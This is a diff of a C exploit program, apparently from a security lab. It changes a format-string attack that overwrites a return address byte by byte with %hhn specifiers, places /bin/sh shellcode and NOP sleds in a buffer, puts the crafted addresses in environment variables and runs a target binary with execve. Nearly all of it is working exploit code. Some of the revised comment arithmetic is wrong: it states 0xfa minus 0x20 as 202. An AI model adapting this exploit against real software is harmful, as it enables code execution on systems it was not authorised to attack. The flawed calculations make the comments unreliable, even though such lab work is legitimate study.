@@ -36,7 +36,7 @@
 int main(void)
 {
   char *args[3];
-  char *env[17];
+  char *env[20];
 
   char buf[256];
 
@@ -47,15 +47,15 @@ int main(void)
 
   // Encode format string to achieve desired hack
   /*
-    Partition 0x3021fa30:
+    Partition 0x3021fa20:
     0x30: 48
     0xfa: 250
     0x21: 33
     0x30: 48
 
-    Calculate the difference as %hhn writes the culmulative printed length:
-    0x30 - 40 = 8
-    0xfa - 0x30 = 202
+    Calculate the difference as %hhn writes the cumulative printed length:
+    0x30
+    0xfa - 0x20 = 202
     0x121 - 0x0fa = 39
     0x30 - 0x21 = 15
 
@@ -63,29 +63,25 @@ int main(void)
     So the culmulative length is 0xfa + 39 = 289 (0x121), exceeding 1 byte in size.
     Specifier %hhn writes LSB, which is just 0x21. Same thing in the 1st calculation.
   */
-  char format_content[] = "%08x%08x%08x%08x%16x%hhn%202x%hhn%39x%hhn%15x%hhn";
+  char specifiers[] = "%08x%08x%08x%08x%16x%hhn%202x%hhn%39x%hhn%15x%hhn";
 
   /*
-    Copy it starting from the 28th bytes of the buffer so that the format specifiers
+    Copy it starting from the 4th bytes of the buffer so that the format specifiers
     would start from the 60th byte of formatString[]:
-    0 ~ 27 -> 28 bytes, 28 + 32 = 60 bytes -> 0 ~ 59 of formatString.
+    0 ~ 3 -> 4 bytes, 4 + 56 = 60 bytes -> 0 ~ 59 of formatString;
+    Then the specifiers start from 60th byte.
   */
   for (int i = 0; i < 49; i++) {
-    buf[28 + i] = format_content[i];
+    buf[4 + i] = specifiers[i];
   }
 
   /*
     Inject shellcode at 144th byte;
     By calculation, the address of shellcode will be 0x3021f9a0 + 144 bytes = 0x3021fa30;
     This address will be used to overwrite the return address.
-
-    The first 4 bytes are left because the format string is read starting from 60th bytes,
-    and our strategy accommandates 64 bytes at the beginning of the format string,
-    which results in 4 null bytes starting from 60th.
-    Therefore another 4 bytes are used to complete the alignment as 4 + 4 = 8.
   */
   for (int i = 0; i < 45; i++) {
-		buf[112 + i] = shellcode[i];
+		buf[88 + i] = shellcode[i];
 	}
 
   buf[252] = '\x00';
@@ -99,8 +95,11 @@ int main(void)
   char ret_addr_3[] = "\x8a\xf9\x21\x30";
   char ret_addr_4[] = "\x8b\xf9\x21\x30";
 
+  // Garbage string
+  char garbage[] = "garbage";
+
   // Encode env to accommodate null bytes
-  args[0] = TARGET; 
+  args[0] = TARGET;
   args[1] = ret_addr_1;
   args[2] = NULL;
 
@@ -108,27 +107,35 @@ int main(void)
   env[1] = "\x00";
   env[2] = "\x00";
 
-  env[3] =  ret_addr_2;
-  env[4] = "\x00";
+  /*
+    An 8-byte garbage string needs to be put between the byte-wise address to be written,
+    because the %x before each %hhn would cause a jump-reading in stack, and we would like:
+      %x   -> garbage values;
+      %hhn -> specified byte-wise RIP address.
+  */
+  env[3] = garbage;
+
+  env[4] =  ret_addr_2;
   env[5] = "\x00";
   env[6] = "\x00";
+  env[7] = "\x00";
 
-  env[7] = ret_addr_3;
-  env[8] = "\x00";
-  env[9] = "\x00";
+  env[8] = garbage;
+
+  env[9] = ret_addr_3;
   env[10] = "\x00";
-
-  env[11] = ret_addr_4;
+  env[11] = "\x00";
   env[12] = "\x00";
-  env[13] = "\x00";
-  env[14] = "\x00";
 
-  env[15] = buf;
-  env[16] = NULL;
+  env[13] = garbage;
 
-  for (int i = 0; i < 17; i++) {
-    print_hexcode(env[i]);
-  }
+  env[14] = ret_addr_4;
+  env[15] = "\x00";
+  env[16] = "\x00";
+  env[17] = "\x00";
+
+  env[18] = buf;
+  env[19] = NULL;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
@@ -141,20 +148,17 @@ int main(void)
 
   \x88\xf9\x21\x30 <- return address 1
   \x00\x00\x00\x00
+  (garbage values)
   \x89\xf9\x21\x30 <- return address 2
   \x00\x00\x00\x00
+  (garbage values)
   \x8a\xf9\x21\x30 <- return address 3
   \x00\x00\x00\x00
   \x8b\xf9\x21\x30 <- return address 4
   \x00\x00\x00\x00
+  (garbage values)
   \x90\x90\x90\x90 <- NOPs
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x25\x30\x38\x78 <- Specifier string start
+  \x25\x30\x38\x78 <- Specifier string start (&formatString[60])
   \x25\x30\x38\x78
   \x25\x30\x38\x78
   \x25\x30\x38\x78
@@ -167,14 +171,7 @@ int main(void)
   \x6e\x25\x31\x35
   \x78\x25\x68\x68
   \x6e\x90\x90\x90 <- NOPs
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
+  (NOPs in middle)
   \xeb\x1f\x5e\x89 <- Start of shellcode
   \x76\x08\x31\xc0
   \x88\x46\x07\x89
@@ -188,28 +185,7 @@ int main(void)
   \x69\x6e\x2f\x73
   \x68\x90\x90\x90 <- End of shellcode
   \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x90
-  \x90\x90\x90\x00
+  (Continuing NOPs)
+  (NULLs)
 
 */
